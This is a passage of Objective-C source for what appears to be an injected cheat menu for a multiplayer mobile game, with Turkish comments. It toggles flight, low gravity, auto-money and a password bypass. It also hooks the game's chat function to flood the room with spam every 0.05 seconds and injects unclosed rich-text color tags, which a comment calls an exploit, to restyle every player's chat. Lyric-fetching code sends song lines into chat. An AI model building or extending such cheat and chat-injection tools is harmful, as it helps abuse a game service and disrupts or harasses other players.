    [w bringSubviewToFront:pad];
}

- (void)tapFlyPad {
    isFlyPadShown = !isFlyPadShown;
    saveBool(@"flypad", isFlyPadShown);
    if (isFlyPadShown) {
        [self buildFlyPad];
        FLog(@"🕹️ Uçuş D-pad AÇIK - Ekran butonlarıyla uçabilirsin!");
    } else {
        if (self.flyPad) { [self.flyPad removeFromSuperview]; self.flyPad = nil; }
        g_dpFwd = g_dpBack = g_dpLeft = g_dpRight = g_dpUp = g_dpDown = false;
        FLog(@"🕹️ Uçuş D-pad KAPALI");
    }
    [self refreshUI];
}
- (void)tapLowGrav   { isLowGravEnabled        = !isLowGravEnabled;        saveBool(@"lowgrav", isLowGravEnabled);          [self refreshUI]; }
- (void)tapBypass    { isBypassPasswordEnabled  = !isBypassPasswordEnabled; saveBool(@"bypass", isBypassPasswordEnabled);    [self refreshUI]; }
- (void)tapAutoMoney { isAutoMoneyEnabled        = !isAutoMoneyEnabled;      saveBool(@"automoney", isAutoMoneyEnabled);      [self refreshUI]; }

- (void)tapChatSpam {
    isSpamEnabled = !isSpamEnabled;
    saveBool(@"chatspam", isSpamEnabled);
    if (spamTimer) { [spamTimer invalidate]; spamTimer = nil; }
    if (isSpamEnabled)
        spamTimer = [NSTimer scheduledTimerWithTimeInterval:0.05 target:self selector:@selector(fireSpam) userInfo:nil repeats:YES];
    [self refreshUI];
}

// YENI: Matrix / Glitch Chat Modlari
- (void)tapMatrixChat {
    isMatrixChatEnabled = !isMatrixChatEnabled;
    if (isMatrixChatEnabled) isGlitchChatEnabled = false;
    saveBool(@"matrixchat", isMatrixChatEnabled);
    saveBool(@"glitchchat", false);
    FLog(isMatrixChatEnabled ? @"Matrix Chat Modu ACIK" : @"Matrix Chat Modu KAPALI");
    [self refreshUI];
}
- (void)tapGlitchChat {
    isGlitchChatEnabled = !isGlitchChatEnabled;
    if (isGlitchChatEnabled) isMatrixChatEnabled = false;
    saveBool(@"glitchchat", isGlitchChatEnabled);
    saveBool(@"matrixchat", false);
    FLog(isGlitchChatEnabled ? @"Glitch Chat Modu ACIK" : @"Glitch Chat Modu KAPALI");
    [self refreshUI];
}
// YENI: Matrix/Glitch mesaji GONDER (hook olmadan - il2cpp chatSend ile calisir).
// Toggle'lar kendi yazdigin mesaji yakalamak icin hook'a muhtac (bu ortamda olu),
// bu butonlar ise mod'dan yazip DOGRUDAN o stilde gonderir -> her zaman calisir.
- (void)promptStyledSend:(int)mode {
    if (!chatGetInst || !chatSend) { FLog(@"Chat hazir degil - once odaya gir"); return; }
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:(mode==0?@"\U0001F7E2 Matrix Mesaji":@"\U0001F480 Glitch Mesaji")
        message:@"Yaz -> o stilde chate gonderilir" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"mesajin..."; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Gonder" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields.firstObject.text;
        if (t.length == 0) { FLog(@"Bos mesaj"); return; }
        NSString *styled = (mode==0) ? matrixWrapChat(t) : glitchWrapChat(t);
        @try { void* mgr = chatGetInst(); void* s = mkStr(styled); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
        FLog(mode==0 ? @"Matrix mesaji gonderildi ✓" : @"Glitch mesaji gonderildi ✓");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
- (void)sendMatrixMsg { [self promptStyledSend:0]; }
- (void)sendGlitchMsg { [self promptStyledSend:1]; }
// Istedigin mesaji, sectigin renkte gonder (herkes gorur - exploit'in kullandigi richText)
- (void)sendColoredChat {
    if (!chatGetInst || !chatSend) { FLog(@"Chat pointeri yok - odaya gir"); return; }
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3A8 Renkli Mesaj Gonder"
        message:@"Yazdigin mesaj SENIN rengin ile gider (herkes gorur)" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"mesajin..."; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Gonder" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields.firstObject.text;
        if (t.length == 0) return;
        NSString *col = [NSString stringWithUTF8String:spamColorHex];
        NSString *msg = [NSString stringWithFormat:@"<color=#%@><b>%@</b></color>", col, t];
        @try { void* mgr = chatGetInst(); void* s = mkStr(msg); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
        FLog([NSString stringWithFormat:@"Renkli mesaj gonderildi (#%@)", col]);
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
// TUM ODA CHATINI senin sectigin renge boya (kapatilmamis renk tag'i -> tum mesajlar boyanir)
- (void)colorAllChat {
    if (!chatGetInst || !chatSend) { FLog(@"Chat hazir degil - odaya gir"); return; }
    NSString *col = [NSString stringWithUTF8String:spamColorHex];
    @try {
        void* mgr = chatGetInst();
        // TEMIZ kapatilmamis renk etiketi -> sonraki TUM mesajlar bu renkte olur.
        // Oyun renk etiketini render ediyor (filtre yok), o yuzden kod YAZISI gorunmez, sadece renk.
        NSString *msg = [NSString stringWithFormat:@"<color=#%@>", col];
        void* s = mkStr(msg); if (mgr && s) chatSend(mgr, s);
    } @catch (...) {}
    FLog([NSString stringWithFormat:@"Oda chati #%@ rengine boyandi (herkes gorur)", col]);
}
- (void)sendChatTemplate {
    if (!chatGetInst || !chatSend) { FLog(@"Chat pointeri yok - odaya gir"); return; }
    NSArray *templates = chatTemplates();
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"📋 Hacker Chat Sablonlari"
                                                               message:@"Sec - chate gonderilir" preferredStyle:UIAlertControllerStyleAlert];
    for (int i = 0; i < (int)templates.count; i++) {
        NSString *t = templates[i];
        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"%d. %@", i+1, t] style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            @try { void* mgr = chatGetInst(); void* s = mkStr(t); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
            FLog([NSString stringWithFormat:@"Chat sablonu gonderildi: %d", i+1]);
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)fireSpam {
    if (!chatGetInst || !chatSend) return;
    @try {
        void* mgr = chatGetInst();
        if (!mgr) return;
        NSString *base = [NSString stringWithUTF8String:chatSpamText];
        NSString *col = [NSString stringWithUTF8String:spamColorHex];
        NSString *msg;
        static int rbIdx = 0;
        if (spamStyle == 1)      msg = [NSString stringWithFormat:@"═══ %@ ═══", base];
        else if (spamStyle == 2) msg = [NSString stringWithFormat:@"★彡 %@ 彡★", base];
        else if (spamStyle == 3) msg = [NSString stringWithFormat:@"<color=#%@><b>%@</b></color>", col, base];       // secili renk
        else if (spamStyle == 4) msg = rainbowWrap(base, rbIdx++);                                                    // gokkusagi
        else if (spamStyle == 5) msg = [NSString stringWithFormat:@"<size=150%%><color=#%@><b>%@</b></color></size>", col, base]; // buyuk+renk
        else if (spamStyle == 6) msg = [NSString stringWithFormat:@"<color=#%@>『 %@ 』</color>", col, base];          // cerceve+renk
        else if (spamStyle == 7) msg = [NSString stringWithFormat:@"<size=200%%>%@</size>", base];                    // BUYUK yazi (renksiz)
        else                     msg = base;
        void* s = mkStr(msg);
        if (s) chatSend(mgr, s);
    } @catch (...) {}
}

- (void)pickSpamStyle:(UIButton*)b {
    spamStyle = (spamStyle + 1) % 8;
    saveInt(@"spamStyle", spamStyle);
    NSArray *names = @[@"Duz", @"Cerceveli", @"Semboller", @"Renkli", @"Gokkusagi", @"Buyuk+Renk", @"Cerceve+Renk", @"BUYUK"];
    [b setTitle:[NSString stringWithFormat:@"\U0001F3AD Spam Stili: %@", names[spamStyle % 8]] forState:UIControlStateNormal];
}
- (void)pickSpamColor {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3A8 Spam Rengi" message:@"Renkli stiller icin" preferredStyle:UIAlertControllerStyleActionSheet];
    void (^add)(NSString*, const char*) = ^(NSString *nm, const char *hex){
        [ac addAction:[UIAlertAction actionWithTitle:nm style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            strncpy(spamColorHex, hex, sizeof(spamColorHex)-1); spamColorHex[sizeof(spamColorHex)-1]='\0';
            saveStr(@"spamColor", [NSString stringWithUTF8String:hex]); [self refreshUI];
        }]];
    };
    add(@"\U0001F534 Kirmizi", "FF3B30"); add(@"\U0001F7E0 Turuncu", "FF9500"); add(@"\U0001F7E1 Sari", "FFCC00");
    add(@"\U0001F7E2 Yesil", "34C759"); add(@"\U0001F535 Mavi", "007AFF"); add(@"\U0001F7E3 Mor", "AF52DE");
    add(@"\U0001F338 Pembe", "FF2D55"); add(@"⚪ Cyan", "00FFFF");
    add(@"⚫ Siyah", "000000"); add(@"⚪ Beyaz", "FFFFFF"); add(@"\U0001F7E4 Kahve", "A2845E");
    [ac addAction:[UIAlertAction actionWithTitle:@"✏️ Ozel Renk (istedigin HEX)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        UIAlertController *hx = [UIAlertController alertControllerWithTitle:@"\U0001F3A8 Ozel Renk (HEX)" message:@"Ornek: FF00FF  (# koyma)" preferredStyle:UIAlertControllerStyleAlert];
        [hx addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = [NSString stringWithUTF8String:spamColorHex]; tf.placeholder = @"FF00FF"; tf.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters; }];
        [hx addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *b){
            NSString *t = [[hx.textFields.firstObject.text stringByReplacingOccurrencesOfString:@"#" withString:@""] uppercaseString];
            if (t.length >= 3 && t.length <= 6) { strncpy(spamColorHex, t.UTF8String, sizeof(spamColorHex)-1); spamColorHex[sizeof(spamColorHex)-1]='\0'; saveStr(@"spamColor", t); FLog([NSString stringWithFormat:@"Chat rengi: #%@ (Chat Spam'i acinca bu renkte olur)", t]); [self refreshUI]; }
            else FLog(@"Gecersiz hex (3-6 karakter: orn FF00FF)");
        }]];
        [hx addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:hx];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    if (ac.popoverPresentationController) { ac.popoverPresentationController.sourceView = self.panel; ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, self.panel.bounds.size.height/2, 1, 1); }
    [self present:ac];
}

// Metni donen gokkusagi renkle sar (chat'te richText render edilir -> renkli gorunur)
static NSString* rainbowWrap(NSString* text, int idx) {
    static NSArray *cols = nil;
    if (!cols) cols = @[@"FF3B30",@"FF9500",@"FFCC00",@"34C759",@"00C7BE",@"007AFF",@"AF52DE",@"FF2D55"];
    NSString *c = cols[((idx % (int)cols.count) + (int)cols.count) % (int)cols.count];
    return [NSString stringWithFormat:@"<color=#%@><b>%@</b></color>", c, text];
}

// ===== SARKI SOZU -> CHAT (altyazi gibi her satiri sirayla gonder) =====
- (void)stopLyrics {
    isLyricsEnabled = false;
    if (lyricsTimer) { [lyricsTimer invalidate]; lyricsTimer = nil; }
    [self refreshUI];
}
- (void)fireLyrics {
    if (!chatGetInst || !chatSend || !g_lyrics || g_lyrics.count == 0) { [self stopLyrics]; return; }
    @try {
        if (g_lyricsIdx >= (int)g_lyrics.count) {
            if (lyricsLoop) { g_lyricsIdx = 0; }
            else { FLog(@"Sarki sozu bitti"); [self stopLyrics]; return; }
        }
        NSString *line = g_lyrics[g_lyricsIdx];
        g_lyricsIdx++;
        if (line.length == 0) return;   // bos satiri atla (zamanlamayi korur)
        NSString *msg = lyricsColorCycle ? rainbowWrap(line, g_colorIdx++) : line;
        void* mgr = chatGetInst();
        void* s = mkStr(msg);
        if (mgr && s) chatSend(mgr, s);
    } @catch (...) {}
}
- (void)tapLyrics {
    if (!isLyricsEnabled) {
        if (!g_lyrics || g_lyrics.count == 0) {
            UIAlertController *w = [UIAlertController alertControllerWithTitle:@"\U0001F3B5 Once sarki sozu gerek"
                message:@"Sozu once getir:\n• 'Sarki Ara' ile internetten\n• ya da 'Elle Sarki Sozu Gir'" preferredStyle:UIAlertControllerStyleAlert];
            [w addAction:[UIAlertAction actionWithTitle:@"\U0001F50D Sarki Ara" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ [self fetchLyricsByName]; }]];
            [w addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
            [self present:w];
            [self refreshUI]; return;
        }
        if (!chatGetInst || !chatSend) { FLog(@"Chat pointeri yok - odaya gir"); [self refreshUI]; return; }
        isLyricsEnabled = true;
        g_lyricsIdx = 0; g_colorIdx = 0;
        if (lyricsTimer) [lyricsTimer invalidate];
        lyricsTimer = [NSTimer scheduledTimerWithTimeInterval:lyricsInterval target:self selector:@selector(fireLyrics) userInfo:nil repeats:YES];
        FLog([NSString stringWithFormat:@"Sarki sozu basladi (%lu satir, %.1fs aralik)", (unsigned long)g_lyrics.count, lyricsInterval]);
    } else {
        [self stopLyrics];
    }
    [self refreshUI];
}
- (void)tapLyricsColor { lyricsColorCycle = !lyricsColorCycle; saveBool(@"lyricsColor", lyricsColorCycle); [self refreshUI]; }
- (void)tapLyricsLoop  { lyricsLoop = !lyricsLoop; saveBool(@"lyricsLoop", lyricsLoop); [self refreshUI]; }

// Cok satirli sarki sozu giris ekrani (her satir ayri chat mesaji olur)
- (void)editLyrics {
    UIWindow *w = getKeyWindow(); if (!w) return;
    if (self.lyricsOverlay) { [self.lyricsOverlay removeFromSuperview]; self.lyricsOverlay = nil; }
    CGFloat W = w.bounds.size.width, H = w.bounds.size.height;
    CGFloat ow = MIN(560.0, W-20), oh = MIN(400.0, H-20);
    self.lyricsOverlay = [[UIView alloc] initWithFrame:CGRectMake((W-ow)/2,(H-oh)/2,ow,oh)];
    self.lyricsOverlay.backgroundColor = [UIColor colorWithRed:0.97 green:0.99 blue:1.0 alpha:0.99];
    self.lyricsOverlay.layer.cornerRadius = 16;
    self.lyricsOverlay.layer.borderWidth = 1.5;
    self.lyricsOverlay.layer.borderColor = C_ACCENT.CGColor;

    UILabel *tl = [[UILabel alloc] initWithFrame:CGRectMake(14,10,ow-28,22)];
    tl.text = @"\U0001F3B5 Sarki Sozu (her satir ayri chat mesaji)";
    tl.textColor = C_TEXT; tl.font = [UIFont systemFontOfSize:14 weight:UIFontWeightBold];
    [self.lyricsOverlay addSubview:tl];

    self.lyricsInput = [[UITextView alloc] initWithFrame:CGRectMake(10,38,ow-20,oh-96)];
    self.lyricsInput.backgroundColor = [UIColor colorWithRed:0.93 green:0.96 blue:0.99 alpha:1.0];
    self.lyricsInput.textColor = C_TEXT;
    self.lyricsInput.font = [UIFont systemFontOfSize:14];
    self.lyricsInput.layer.cornerRadius = 8;
    if (g_lyrics.count) self.lyricsInput.text = [g_lyrics componentsJoinedByString:@"\n"];
    else self.lyricsInput.text = @"";
    [self.lyricsOverlay addSubview:self.lyricsInput];

    UIButton *save = [UIButton buttonWithType:UIButtonTypeSystem];
    save.frame = CGRectMake(10, oh-46, (ow-30)/2, 34);
    save.backgroundColor = C_ON; save.layer.cornerRadius = 8;
    [save setTitle:@"Kaydet" forState:UIControlStateNormal];
    [save setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    save.titleLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightBold];
    [save addTarget:self action:@selector(saveLyrics) forControlEvents:UIControlEventTouchUpInside];
    [self.lyricsOverlay addSubview:save];

    UIButton *cancel = [UIButton buttonWithType:UIButtonTypeSystem];
    cancel.frame = CGRectMake(ow/2+5, oh-46, (ow-30)/2, 34);
    cancel.backgroundColor = [UIColor colorWithRed:0.85 green:0.88 blue:0.92 alpha:1.0]; cancel.layer.cornerRadius = 8;
    [cancel setTitle:@"Iptal" forState:UIControlStateNormal];
    [cancel setTitleColor:C_TEXT forState:UIControlStateNormal];
    cancel.titleLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightSemibold];
    [cancel addTarget:self action:@selector(closeLyrics) forControlEvents:UIControlEventTouchUpInside];
    [self.lyricsOverlay addSubview:cancel];

    [w addSubview:self.lyricsOverlay];
    [self.lyricsInput becomeFirstResponder];
}
- (void)saveLyrics {
    NSString *txt = self.lyricsInput.text ?: @"";
    NSArray *raw = [txt componentsSeparatedByString:@"\n"];
    g_lyrics = [NSMutableArray array];
    for (NSString *l in raw) {
        NSString *t = [l stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        [g_lyrics addObject:t];   // bos satirlari da tut (zamanlama duraklamasi olur)
    }
    saveStr(@"lyricsText", txt);
    FLog([NSString stringWithFormat:@"Sarki sozu kaydedildi: %lu satir", (unsigned long)g_lyrics.count]);
    [self closeLyrics];
    [self refreshUI];
}
- (void)closeLyrics {
    if (self.lyricsInput) [self.lyricsInput resignFirstResponder];
    if (self.lyricsOverlay) { [self.lyricsOverlay removeFromSuperview]; self.lyricsOverlay = nil; }
}
- (void)editLyricsInterval {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3B5 Satir Araligi"
                                                               message:@"Her satir arasi saniye (0.3 - 10)" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeDecimalPad; tf.text = [NSString stringWithFormat:@"%.1f", lyricsInterval]; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        float v = [ac.textFields.firstObject.text floatValue];
        if (v >= 0.3f && v <= 10.0f) { lyricsInterval = v; saveFloat(@"lyricsInterval", v); }
        [self refreshUI];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== SARKI ARA + SEC + SOZU GETIR (arama cubugu, sen yazmazsin) =====
// api.lyrics.ovh: ucretsiz, anahtarsiz. /suggest -> arama, /v1 -> sozler
// NOT: YT/Spotify URL'si sarki adina cevrilemez -> sarki ADINI yaz (link degil).
- (void)fetchLyricsByName {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3B5 Sarki Ara"
                                                               message:@"Sarki adi yaz, listeden sec\n(URL degil, isim: orn 'kuzu kuzu')" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Sarki / sanatci adi";
        NSString *last = loadStr(@"lastSong", @"");
        if (last.length) tf.text = last;
    }];
    [ac addAction:[UIAlertAction actionWithTitle:@"\U0001F50D Ara" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *q = ac.textFields.firstObject.text ?: @"";
        if (q.length < 2) { FLog(@"Arama cok kisa"); return; }
        saveStr(@"lastSong", q);
        [self doSearchLyrics:q];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
// Aramayi yap, eslesen sarkilari liste halinde goster
- (void)doSearchLyrics:(NSString*)q {
    NSString *eq = [q stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLPathAllowedCharacterSet]] ?: @"";
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"https://api.lyrics.ovh/suggest/%@", eq]];
    if (!url) { FLog(@"Gecersiz arama"); return; }
    FLog([NSString stringWithFormat:@"Araniyor: %@ ...", q]);
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err){
        NSMutableArray *results = [NSMutableArray array];   // her eleman: @[artist, title]
        if (data && !err) {
            @try {
                NSDictionary *j = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                NSArray *arr = j[@"data"];
                if ([arr isKindOfClass:[NSArray class]]) {
                    for (NSDictionary *song in arr) {
                        if (![song isKindOfClass:[NSDictionary class]]) continue;
                        NSString *title = song[@"title"];
                        NSString *artist = @"";
                        if ([song[@"artist"] isKindOfClass:[NSDictionary class]]) artist = song[@"artist"][@"name"];
                        NSString *cover = @"";
                        if ([song[@"album"] isKindOfClass:[NSDictionary class]]) {
                            NSDictionary *alb = song[@"album"];
                            cover = alb[@"cover_small"] ?: (alb[@"cover_medium"] ?: (alb[@"cover"] ?: @""));
                        }
                        if ([title isKindOfClass:[NSString class]]) {
                            [results addObject:@[artist ?: @"", title, cover ?: @""]];
                            if (results.count >= 10) break;
                        }
                    }
                }
            } @catch (...) {}
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            if (results.count == 0) { FLog(@"Sonuc bulunamadi, baska ara"); return; }
            [self showSongPicker:results];
        });
    }];
    [task resume];
}
// Album resimli sarki secim ekrani (kaydirilabilir, resimler async yuklenir)
- (void)showSongPicker:(NSArray*)results {
    UIWindow *w = getKeyWindow(); if (!w) return;
    if (self.songPicker) { [self.songPicker removeFromSuperview]; self.songPicker = nil; }
    CGFloat W = w.bounds.size.width, H = w.bounds.size.height;
    CGFloat ow = MIN(460.0, W-20), oh = MIN(440.0, H-20);
    UIView *ov = [[UIView alloc] initWithFrame:CGRectMake((W-ow)/2,(H-oh)/2,ow,oh)];
    ov.backgroundColor = [UIColor colorWithRed:0.97 green:0.99 blue:1.0 alpha:0.99];
    ov.layer.cornerRadius = 16; ov.layer.borderWidth = 1.5; ov.layer.borderColor = C_ACCENT.CGColor;
    self.songPicker = ov;
    UILabel *tl = [[UILabel alloc] initWithFrame:CGRectMake(14,10,ow-60,24)];
    tl.text = @"\U0001F3B5 Sarki Sec"; tl.textColor = C_TEXT; tl.font = [UIFont boldSystemFontOfSize:15];
    [ov addSubview:tl];
    UIButton *x = [UIButton buttonWithType:UIButtonTypeSystem];
    x.frame = CGRectMake(ow-42,8,32,32); [x setTitle:@"✕" forState:UIControlStateNormal];
    [x setTitleColor:C_TEXT forState:UIControlStateNormal]; x.titleLabel.font = [UIFont systemFontOfSize:18];
    [x addTarget:self action:@selector(closeSongPicker) forControlEvents:UIControlEventTouchUpInside];
    [ov addSubview:x];
    UIScrollView *sc = [[UIScrollView alloc] initWithFrame:CGRectMake(8,40,ow-16,oh-48)];
    [ov addSubview:sc];
    CGFloat yy = 0;
    for (NSArray *r in results) {
        NSString *artist = r[0], *title = r[1], *cover = r[2];
        UIView *row = [[UIView alloc] initWithFrame:CGRectMake(0,yy,ow-16,60)];
        row.backgroundColor = [UIColor colorWithRed:0.93 green:0.96 blue:0.99 alpha:1.0];
        row.layer.cornerRadius = 10;
        UIImageView *iv = [[UIImageView alloc] initWithFrame:CGRectMake(6,6,48,48)];
        iv.backgroundColor = [UIColor colorWithWhite:0.85 alpha:1]; iv.layer.cornerRadius = 6; iv.clipsToBounds = YES;
        iv.contentMode = UIViewContentModeScaleAspectFill;
        [row addSubview:iv];
        if (cover.length) {
            NSURL *cu = [NSURL URLWithString:cover];
            if (cu) { [[[NSURLSession sharedSession] dataTaskWithURL:cu completionHandler:^(NSData *d, NSURLResponse *rp, NSError *e){
                if (d) { UIImage *im = [UIImage imageWithData:d]; if (im) dispatch_async(dispatch_get_main_queue(), ^{ iv.image = im; }); }
            }] resume]; }
        }
        UILabel *lb = [[UILabel alloc] initWithFrame:CGRectMake(62,8,ow-16-70,44)];
        lb.numberOfLines = 2;
        NSMutableAttributedString *s = [[NSMutableAttributedString alloc] initWithString:[NSString stringWithFormat:@"%@\n%@", title, artist]];
        [s addAttributes:@{NSFontAttributeName:[UIFont boldSystemFontOfSize:13], NSForegroundColorAttributeName:C_TEXT} range:NSMakeRange(0, title.length)];
        [s addAttributes:@{NSFontAttributeName:[UIFont systemFontOfSize:11], NSForegroundColorAttributeName:C_SUB} range:NSMakeRange(title.length, s.length-title.length)];
        lb.attributedText = s;
        [row addSubview:lb];
        UIButton *tap = [UIButton buttonWithType:UIButtonTypeCustom];
        tap.frame = row.bounds;
        objc_setAssociatedObject(tap, "sartist", artist, OBJC_ASSOCIATION_RETAIN);
        objc_setAssociatedObject(tap, "stitle", title, OBJC_ASSOCIATION_RETAIN);
        [tap addTarget:self action:@selector(songPicked:) forControlEvents:UIControlEventTouchUpInside];
        [row addSubview:tap];
        [sc addSubview:row];
        yy += 66;
    }
    sc.contentSize = CGSizeMake(ow-16, yy);
    [w addSubview:ov];
}
- (void)songPicked:(UIButton*)b {
    NSString *artist = objc_getAssociatedObject(b, "sartist");
    NSString *title = objc_getAssociatedObject(b, "stitle");
    [self closeSongPicker];
    [self doFetchLyricsArtist:artist title:title];
}
- (void)closeSongPicker { if (self.songPicker) { [self.songPicker removeFromSuperview]; self.songPicker = nil; } }
- (void)doFetchLyricsArtist:(NSString*)artist title:(NSString*)title {
    [self doFetchLyrics:[NSString stringWithFormat:@"%@ - %@", artist ?: @"", title ?: @""]];
}
- (void)doFetchLyrics:(NSString*)q {
    NSString *artist = @"", *title = q;
    NSRange dash = [q rangeOfString:@" - "];
    if (dash.location != NSNotFound) { artist = [q substringToIndex:dash.location]; title = [q substringFromIndex:dash.location + 3]; }
    artist = [artist stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    title  = [title stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    FLog([NSString stringWithFormat:@"Sarki sozu araniyor (LRCLIB): %@ ...", q]);
    // Adim 1 - LRCLIB : genis kapsamli, bedava
    NSString *lq = [[NSString stringWithFormat:@"%@ %@", artist, title] stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]] ?: @"";
    NSURL *lrc = [NSURL URLWithString:[NSString stringWithFormat:@"https://lrclib.net/api/search?q=%@", lq]];
    if (!lrc) { [self fetchOvhFallback:artist title:title]; return; }
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:lrc];
    [req setValue:@"FEW1NMod/1.0 (iOS)" forHTTPHeaderField:@"User-Agent"];
    NSString *ac = artist, *tc = title;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err){
        NSString *lyr = nil;
        if (data && !err) {
            @try {
                id arr = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                if ([arr isKindOfClass:[NSArray class]]) {
                    for (NSDictionary *it in (NSArray*)arr) {
                        if (![it isKindOfClass:[NSDictionary class]]) continue;
                        NSString *pl = it[@"plainLyrics"];
                        if ([pl isKindOfClass:[NSString class]] && pl.length > 0) { lyr = pl; break; }
                    }
                }
            } @catch (...) {}
        }
        if (lyr.length) dispatch_async(dispatch_get_main_queue(), ^{ [self fillLyrics:lyr]; });
        else [self fetchOvhFallback:ac title:tc];   // Adim 2 - LRCLIB bulamadi, lyrics.ovh yedek
    }] resume];
}
- (void)fetchOvhFallback:(NSString*)artist title:(NSString*)title {
    NSCharacterSet *set = [NSCharacterSet URLPathAllowedCharacterSet];
    NSString *ea = [artist stringByAddingPercentEncodingWithAllowedCharacters:set] ?: @"";
    NSString *et = [title stringByAddingPercentEncodingWithAllowedCharacters:set] ?: @"";
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"https://api.lyrics.ovh/v1/%@/%@", ea, et]];
    if (!url) { dispatch_async(dispatch_get_main_queue(), ^{ FLog(@"Sarki sozu bulunamadi"); }); return; }
    [[[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err){
        NSString *lyr = nil;
        if (data && !err) { @try { NSDictionary *j = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil]; if ([j isKindOfClass:[NSDictionary class]] && [j[@"lyrics"] isKindOfClass:[NSString class]]) lyr = j[@"lyrics"]; } @catch (...) {} }
        dispatch_async(dispatch_get_main_queue(), ^{
            if (lyr.length) [self fillLyrics:lyr];
            else FLog(@"Sarki sozu hicbir kaynakta yok (baska sarki/yazim dene)");
        });
    }] resume];
}
- (void)fillLyrics:(NSString*)lyr {
    NSArray *lines = [lyr componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
    g_lyrics = [NSMutableArray array];
    for (NSString *l in lines) [g_lyrics addObject:[l stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]]];
    saveStr(@"lyricsText", [g_lyrics componentsJoinedByString:@"\n"]);
    FLog([NSString stringWithFormat:@"✓ Sarki sozu geldi: %lu satir. Artik 'Baslat'a basabilirsin.", (unsigned long)g_lyrics.count]);
    [self refreshUI];
}

- (void)fireAscii {
    if (!chatGetInst || !chatSend) return;
    @try {
        NSArray *anims = asciiAnims();
        if (anims.count == 0) return;
        if (asciiAnimIndex < 0 || asciiAnimIndex >= (int)anims.count) asciiAnimIndex = 0;
        NSArray *frames = anims[asciiAnimIndex];
        if (frames.count == 0) return;
        if (asciiFrameIdx < 0 || asciiFrameIdx >= (int)frames.count) asciiFrameIdx = 0;
        NSString *frame = frames[asciiFrameIdx];
        asciiFrameIdx++;
        if (asciiColorCycle) frame = rainbowWrap(frame, g_colorIdx++);   // gokkusagi renk dongusu
        void* mgr = chatGetInst();
        if (!mgr) return;
        void* s = mkStr(frame);
        if (s) chatSend(mgr, s);
    } @catch (...) {}
}
